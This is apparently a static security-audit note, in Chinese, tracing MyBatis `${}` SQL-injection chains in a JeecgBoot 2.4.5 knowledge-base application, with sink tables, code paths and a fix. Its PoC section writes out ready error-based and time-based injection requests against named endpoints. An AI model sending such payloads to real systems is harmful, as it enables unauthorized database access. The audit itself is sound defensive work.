# JeecgBoot 2.4.5 route2 实例：Mapper XML `${}` 链路证据（kykms / zsk）

> 2026-08-11 实测审计（纯静态，未发送 PoC）。目标 zsk.example.edu `/ky`，源码 dump `D:\tools\audit\kykms`。
> 作用：作为 mybatis-xml-sqli-audit 的可复现案例——同一套链在别的 JeecgBoot 二开里几乎原样复现。

## 版本证据（无 pom.xml 的 dump）

- `deploy/docker-compose.yml:70` 与 `deploy/docker-compose-build.yml:75`：
  `command: java -jar ./jeecg-boot-module-system-2.4.5.jar ...` → **JeecgBoot 2.4.5**（< 3.5.0，CVE-2023-1454 受影响区间）
- 代码佐证：`KmDocController.java:13-17` import `org.jeecg.common.system.query.QueryGenerator` / `LoginUser` / `PermissionData`
- context-path `/ky`：`deploy/kykms/config/application-prod.yml:7`
- 报错回显放大器：`application-prod.yml:3-6` `include-exception: true / include-stacktrace: ALWAYS / include-message: ALWAYS`
- druid 无 `allowMultiQueries` → 堆叠注入不可用，PoC 只写报错/时间

## sink 全量（12 个 XML 中 2 个含 ${}，共 5 点）

| # | 文件:行号 | 内容 | 来源 |
|---|---|---|---|
| S1 | KmDocMapper.xml:153 | `${orderBy}`（choose 块） | column/order 请求参数 |
| S2 | KmDocFavouriteMapper.xml:92 | `${orderBy}`（choose 块，条件 `orderBy != 'ORDER BY create_time DESC'` 不构成防护） | column/order 请求参数 |
| S3 | KmDocMapper.xml:150 | `${permissionSql}`（</where> 后） | `installAuthJdbc` 服务端 |
| S4 | KmDocMapper.xml:44 | `kdf.user_id='${userId}'`（JOIN ON） | sysUser.getId() |
| S5 | KmDocFavouriteMapper.xml:35 | `kdf.user_id='${userId}'`（WHERE） | sysUser.getId() |

其余 10 个 XML（KmDocBusinessType/KmDocComments/KmDocTopicType/KmDocVersion/KmDocVisitRecord/KmFile/KmSearchRecord/KmSysConfig/KmSysDbBackup/KmTopicType）0 个 `${}`。

## orderBy 链（S1/S2，高置信度）

KmDocController.java:
- `:244-245`（listDraft）、`:276-277`（listWaitAudit）、`:301-302`（listPassed）、`:315-316`（listRecently）：
  ```java
  QueryWrapper<KmDocParamVO> queryWrapper = QueryGenerator.initQueryWrapper(kmDocParamVO, req.getParameterMap());
  String orderBy = queryWrapper.getExpression().getOrderBy().getSqlSegment();
  ```
KmDocFavouriteController.java `:57-58`（/KM/kmDocFavourite/list）：同款，实体换 `KmDocVO`。

Service → Mapper：
- `KmDocServiceImpl.java:166-181`：`queryPageList` → `:167` `installAuthJdbc(KmDocVO.class)` → `:181` `kmDocMapper.getPageList(page, userId, vo, permissionSql, dbType, orderBy)`；`:186-205` `queryPublicPageList`（permissionSql 传 `""`）
- `KmDocFavouriteServiceImpl.java:32-34` → `kmDocFavouriteMapper.getPageList(page, userId, vo, dbType, orderBy)`
- 接口：`KmDocMapper.java:17-22`、`KmDocFavouriteMapper.java:17`（@Param("orderBy")）
- Sink：`KmDocMapper.xml:151-158` / `KmDocFavouriteMapper.xml:90-97` `<choose>`

全程无过滤/转义/类型强制。

## PoC 结构（未发送）

- 报错：`GET /ky/KM/kmDoc/listPassed?pageNo=1&pageSize=10&column=id&order=desc,extractvalue(1,concat(0x7e,(select user()),0x7e))` + Cookie `X-Access-Token=<token>`
  - 预期差异：基线 success:true + records；注入 success:false + `XPATH syntax error: '~root@localhost'` 回显
- 双列变体：`column=id,(select updatexml(1,concat(0x7e,(select database()),0x7e),1))&order=desc,asc`
- 时间盲注：`order=desc,sleep(5)` → 延迟 ~5s
- 收藏列表同款：`GET /ky/KM/kmDocFavourite/list?column=id&order=desc,extractvalue(...)`

## permissionSql 链（S3，低置信度·条件性）

- `KmDocServiceImpl.java:167` `QueryGenerator.installAuthJdbc(KmDocVO.class)` → `:181` → `KmDocMapper.xml:150`
- 服务端按角色 sys_permission_data_rule 拼装；ruleType=4 自定义规则值裸 SQL 直拼。HTTP 不可直控。
- 利用前提：可控数据规则值（admin 配置侧/二次注入）→ 建议线上核查该表。

## userId 链（S4/S5，极低置信度·潜伏面）

- `KmDocServiceImpl.java:169-173`（queryPageList）/ `:202`（queryPublicPageList）；`KmDocFavouriteController.java:50-60` → `sysUser.getId()`（登录态 UUID，不可控）
- 潜伏点：同文件 `KmDocServiceImpl.java:275,1347` 用 `sysUser.getUsername()` 当 userId——username 若可注册/第三方受控，将来流入本类 sink 即成 `'...'` 引号逃逸。修复：`#{userId}`。

## 附带发现

- 框架级同源面：其余控制器（KmDocBusinessTypeController.java:46、KmDocTopicTypeController.java:46、KmDocVisitRecordController.java:92、KmFileController.java:46、KmSearchRecordController.java:68、KmSysConfigController.java:52、KmSysDbBackupController.java:66）与基座 JeecgController 的 list/exportXls 均走 initQueryWrapper + MP orderByAsc/Desc(String) → MP 对 String 列名原样进 ORDER BY（不依赖 XML ${}）。基座源码不在 dump，exportXls 路径标中置信度。
- `KmDocMapper.xml:156` otherwise 分支 `order km_doc.create_time desc` 缺 BY，语法可疑（旁注）。
- KmDocCommentsMapper.getPageList（KmDocCommentsServiceImpl.java:40）全 `#{}`，安全。
